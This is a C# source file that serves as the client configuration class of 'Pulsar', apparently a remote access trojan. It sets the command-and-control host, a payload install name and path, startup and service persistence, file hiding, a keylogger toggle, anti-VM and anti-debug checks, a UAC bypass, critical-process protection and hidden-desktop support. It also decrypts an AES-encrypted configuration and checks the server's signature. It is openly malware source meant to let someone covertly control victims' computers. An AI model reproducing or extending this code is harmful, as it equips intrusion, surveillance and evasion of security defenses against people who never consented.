using Pulsar.Common.Cryptography;
using Pulsar.Common.Models;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;

namespace Pulsar.Client.Config
{
    /// <summary>
    /// Stores the configuration of the client.
    /// </summary>
    public static class Settings
    {
    // Version string reported to the server regardless of assembly metadata.
    private const string VersionOverride = "2.4.5";

#if DEBUG
        public static string VERSION = "1.0.0";
        public static string HOSTS = "127.0.0.1:4783;";
        public static int RECONNECTDELAY = 500;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static string SUBDIRECTORY = "Test";
        public static string INSTALLNAME = "test.exe";
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static string MUTEX = "123AKs82kA,ylAo2kAlUS2kYkala!";
        public static string STARTUPKEY = "Pulsar Client Startup";
        public static bool HIDEFILE = false;
        public static bool ENABLELOGGER = false;
        public static string ENCRYPTIONKEY = "";
        public static string TAG = "DEBUG";
        public static string LOGDIRECTORYNAME = "Logs";
        public static string SERVERSIGNATURE = "";
        public static string SERVERCERTIFICATESTR = "";
        public static X509Certificate2 SERVERCERTIFICATE;
        public static bool HIDELOGDIRECTORY = false;
        public static bool HIDEINSTALLSUBDIRECTORY = false;
        public static string INSTALLPATH = "";
        public static string LOGSPATH = "";
        public static bool ANTIVM = false;
        public static bool ANTIDEBUG = false;
        public static bool PASTEBIN = false;
        public static bool UACBYPASS = false;
        public static bool MAKEPROCESSCRITICAL = false; // if true it will attempt to make the process crititcal (needs admin fr)
        public static bool INSTALLSERVICE = false; // if true the installed copy registers a Windows service running with the -service argument
        public static bool SHOWCLIENTGUI = false; // if true the client shows a tray icon with a status window

        // needed for hvnc (why?) why not use the desktop pointer directly?
        public static IntPtr OriginalDesktopPointer = IntPtr.Zero;

        public static bool Initialize()
        {
            SetupPaths();
            
            string logFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_init.log");
            try
            {
                using (var writer = System.IO.File.AppendText(logFile))
                {
                    writer.WriteLine($"[{DateTime.Now:HH:mm:ss.fff}] INIT START");
                    writer.WriteLine($"[{DateTime.Now:HH:mm:ss.fff}] HOSTS: \"{HOSTS}\"");
                    writer.WriteLine($"[{DateTime.Now:HH:mm:ss.fff}] VERSION: \"{VERSION}\"");
                    writer.WriteLine($"[{DateTime.Now:HH:mm:ss.fff}] TAG: \"{TAG}\"");
                    writer.WriteLine($"[{DateTime.Now:HH:mm:ss.fff}] PASTEBIN: {PASTEBIN}");
                }
            }
            catch { }
            
            // Load server certificate from shared location for DEBUG mode
            try
            {
                string certPath = @"C:\Users\chris\Downloads\c2panel\pulsar\bin\Release\net9.0-windows\PulsarStuff\Pulsar.p12";
                if (File.Exists(certPath))
                {
                    SERVERCERTIFICATE = new X509Certificate2(certPath, "", X509KeyStorageFlags.DefaultKeySet);
                    System.Diagnostics.Debug.WriteLine("[INIT] Server certificate loaded");
                    try { System.IO.File.AppendAllText(logFile, $"[{DateTime.Now:HH:mm:ss.fff}] Certificate loaded\r\n"); } catch { }
                }
            }
            catch (Exception ex)
            {
                try { System.IO.File.AppendAllText(logFile, $"[{DateTime.Now:HH:mm:ss.fff}] Certificate error: {ex.Message}\r\n"); } catch { }
            }
            
            return true;
        }
#else
        public static string VERSION = "2.4.5";
        public static string HOSTS = "127.0.0.1:4783;";
        public static int RECONNECTDELAY = 5000;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static string SUBDIRECTORY = "PulsarStuff";
        public static string INSTALLNAME = "pulsar_payload.exe";
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static string MUTEX = "PulsarMutex_2024_v2_4_5";
        public static string STARTUPKEY = "PulsarStartup";
        public static bool HIDEFILE = false;
        public static bool ENABLELOGGER = false;
        public static string ENCRYPTIONKEY = "";
        public static string TAG = "RELEASE_PAYLOAD";
        public static string LOGDIRECTORYNAME = "Logs";
        public static string SERVERSIGNATURE = "";
        public static string SERVERCERTIFICATESTR = "";
        public static X509Certificate2 SERVERCERTIFICATE;
        public static bool HIDELOGDIRECTORY = false;
        public static bool HIDEINSTALLSUBDIRECTORY = false;
        public static string INSTALLPATH = "";
        public static string LOGSPATH = "";
        public static bool ANTIVM = false;
        public static bool ANTIDEBUG = false;
        public static bool PASTEBIN = false;
        public static bool UACBYPASS = false;
        public static bool MAKEPROCESSCRITICAL = false; // if true it will attempt to make the process crititcal (needs admin fr)
        public static bool INSTALLSERVICE = false; // if true the installed copy registers a Windows service running with the -service argument
        public static bool SHOWCLIENTGUI = false; // if true the client shows a tray icon with a status window

        // needed for hvnc
        public static IntPtr OriginalDesktopPointer = IntPtr.Zero;

        public static bool Initialize()
        {
            // In RELEASE with hardcoded values, load certificate
            if (!string.IsNullOrEmpty(VERSION))
            {
                try
                {
                    // Try relative path first (from exe directory)
                    string certPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "PulsarStuff", "Pulsar.p12");
                    if (!File.Exists(certPath))
                    {
                        // Fallback to absolute path for development
                        certPath = @"C:\Users\chris\Downloads\c2panel\pulsar\bin\Release\net9.0-windows\PulsarStuff\Pulsar.p12";
                    }
                    
                    if (File.Exists(certPath))
                    {
                        SERVERCERTIFICATE = new X509Certificate2(certPath, "", X509KeyStorageFlags.DefaultKeySet);
                    }
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"[INIT] Certificate error: {ex.Message}");
                }
                
                SetupPaths();
                return true;
            }
            
            var aes = new Aes256(ENCRYPTIONKEY);
            TAG = aes.Decrypt(TAG);
            VERSION = aes.Decrypt(VERSION);
            HOSTS = aes.Decrypt(HOSTS);
            SUBDIRECTORY = aes.Decrypt(SUBDIRECTORY);
            INSTALLNAME = aes.Decrypt(INSTALLNAME);
            MUTEX = aes.Decrypt(MUTEX);
            STARTUPKEY = aes.Decrypt(STARTUPKEY);
            LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
            SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
            SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
            SetupPaths();
            return VerifyHash();
        }
#endif

    public static string ReportedVersion => string.IsNullOrWhiteSpace(VersionOverride) ? VERSION : VersionOverride;

        static void SetupPaths()
        {
            LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
        }

        static bool VerifyHash()
        {
            try
            {
                using (var rsa = SERVERCERTIFICATE.GetRSAPublicKey())
                {
                    var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY));
                    return rsa.VerifyHash(hash, Convert.FromBase64String(SERVERSIGNATURE), HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
                }
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
